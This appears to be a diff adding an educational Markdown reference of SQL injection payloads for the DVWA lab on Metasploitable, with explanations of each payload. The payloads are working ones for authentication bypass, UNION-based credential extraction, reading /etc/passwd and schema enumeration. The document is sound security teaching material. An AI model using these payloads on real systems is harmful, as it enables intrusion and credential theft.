@@ -1,0 +1,208 @@
+# SQL Injection Payload Types - Educational Reference
+
+**Author:** NyxTheDark  
+**Target:** DVWA on Metasploitable VM  
+**Purpose:** Educational demonstration of SQL injection attack vectors  
+
+This file contains various types of SQL injection payloads used in the demonstration, along with detailed explanations of how each payload works and what it accomplishes.
+
+## 🎯 Basic SQL Injection Payloads
+
+### 1. Boolean-Based Authentication Bypass
+```sql
+1' OR '1'='1
+```
+**Explanation:**
+- Closes the original quote with `1'`
+- Adds an OR condition that is always true: `'1'='1'`
+- This bypasses the WHERE condition and returns all records
+- **Use Case:** Authentication bypass, data enumeration
+
+### 2. Comment-Based Injection (MySQL)
+```sql
+1' OR '1'='1' #
+```
+**Explanation:**
+- Similar to above but uses `#` to comment out the rest of the query
+- Everything after `#` is ignored by MySQL
+- **Use Case:** Bypassing additional WHERE conditions or LIMIT clauses
+
+### 3. Comment-Based Injection (SQL Server/Oracle)
+```sql
+1' OR '1'='1' --
+```
+**Explanation:**
+- Uses `--` for commenting (standard SQL comment)
+- Works with most SQL databases
+- **Use Case:** Universal commenting technique
+
+### 4. Numeric Injection
+```sql
+1 OR 1=1
+```
+**Explanation:**
+- Used when the parameter is numeric (no quotes needed)
+- Creates a condition that's always true
+- **Use Case:** Numeric fields without quote escaping
+
+### 5. String Concatenation Test
+```sql
+1' AND '1'='1
+```
+**Explanation:**
+- Tests if the injection point allows string manipulation
+- Should return the same result as a normal query if vulnerable
+- **Use Case:** Verifying injection capability without obvious changes
+
+## 🔗 UNION-Based SQL Injection Payloads
+
+### 6. Column Count Detection
+```sql
+1' ORDER BY 1 --
+1' ORDER BY 2 --
+1' ORDER BY 3 --
+```
+**Explanation:**
+- Used to determine the number of columns in the original query
+- Keep incrementing until you get an error
+- **Use Case:** Preparation for UNION attacks
+
+### 7. UNION with NULL Values
+```sql
+1' UNION SELECT null,null --
+```
+**Explanation:**
+- Tests UNION compatibility with 2 columns
+- NULL is compatible with any data type
+- **Use Case:** Initial UNION injection testing
+
+### 8. Database Version Extraction
+```sql
+1' UNION SELECT version(),database() --
+```
+**Explanation:**
+- `version()` returns the MySQL version
+- `database()` returns the current database name
+- **Use Case:** Information gathering
+
+### 9. User and Database Information
+```sql
+1' UNION SELECT user(),@@version --
+```
+**Explanation:**
+- `user()` returns the current database user
+- `@@version` is an alternative way to get version info
+- **Use Case:** Understanding the database environment
+
+### 10. Table Enumeration
+```sql
+1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database() --
+```
+**Explanation:**
+- Queries the `information_schema` to list all tables
+- `table_schema=database()` limits results to current database
+- **Use Case:** Discovering database structure
+
+### 11. Column Enumeration
+```sql
+1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --
+```
+**Explanation:**
+- Lists all columns in the 'users' table
+- Uses `information_schema.columns` system table
+- **Use Case:** Understanding table structure before data extraction
+
+### 12. User Credentials Extraction
+```sql
+1' UNION SELECT user,password FROM users --
+```
+**Explanation:**
+- Directly extracts usernames and passwords from users table
+- Most common goal of SQL injection attacks
+- **Use Case:** Credential harvesting
+
+### 13. Conditional Data Extraction
+```sql
+1' UNION SELECT IF(length(database())>5,'true','false'),null --
+```
+**Explanation:**
+- Uses conditional logic to extract information gradually
+- Useful when direct extraction isn't possible
+- **Use Case:** Blind SQL injection techniques
+
+## 🕵️ Advanced Information Gathering
+
+### 14. File System Access (MySQL)
+```sql
+1' UNION SELECT load_file('/etc/passwd'),null --
+```
+**Explanation:**
+- Attempts to read system files using MySQL's load_file() function
+- **Use Case:** System file access (requires FILE privilege)
+
+### 15. Multiple Database Enumeration
+```sql
+1' UNION SELECT schema_name,null FROM information_schema.schemata --
+```
+**Explanation:**
+- Lists all databases on the server
+- **Use Case:** Expanding attack scope beyond current database
+
+### 16. Privilege Enumeration
+```sql
+1' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges --
+```
+**Explanation:**
+- Shows what privileges the current user has
+- **Use Case:** Understanding attack limitations and possibilities
+
+## 🛡️ Payload Categories Explained
+
+### Authentication Bypass Payloads
+- **Purpose:** Skip login mechanisms
+- **Technique:** Make WHERE conditions always true
+- **Examples:** `' OR '1'='1`, `' OR 1=1 --`
+
+### Data Extraction Payloads
+- **Purpose:** Retrieve sensitive information
+- **Technique:** Use UNION to combine malicious query with original
+- **Examples:** `UNION SELECT user,password FROM users`
+
+### Information Gathering Payloads
+- **Purpose:** Learn about database structure
+- **Technique:** Query system tables and functions
+- **Examples:** `UNION SELECT table_name FROM information_schema.tables`
+
+### Blind Injection Payloads
+- **Purpose:** Extract data when results aren't directly visible
+- **Technique:** Use conditional logic and time delays
+- **Examples:** `IF(condition,'true','false')`, `SLEEP(5)`
+
+## ⚠️ Testing Guidelines
+
+### Safe Testing Environment
+- Only use these payloads on systems you own or have permission to test
+- DVWA on Metasploitable is specifically designed for this purpose
+- Never test on production systems without authorization
+
+### Payload Modification
+- Replace table/column names based on your target discovery
+- Adjust number of NULL values based on column count
+- Modify comment syntax based on database type
+
+### Expected Results
+- Authentication bypass: Multiple user records displayed
+- Data extraction: Sensitive information revealed
+- Information gathering: Database structure exposed
+
+## 📚 Educational Value
+
+Understanding these payloads helps with:
+- **Offensive Security:** Penetration testing skills
+- **Defensive Security:** Recognizing attack patterns
+- **Secure Development:** Avoiding vulnerable code patterns
+- **Security Awareness:** Understanding attack methodologies
+
+---
+
+**Remember:** These payloads are for educational and authorized testing purposes only. Always ensure proper authorization before testing any system.
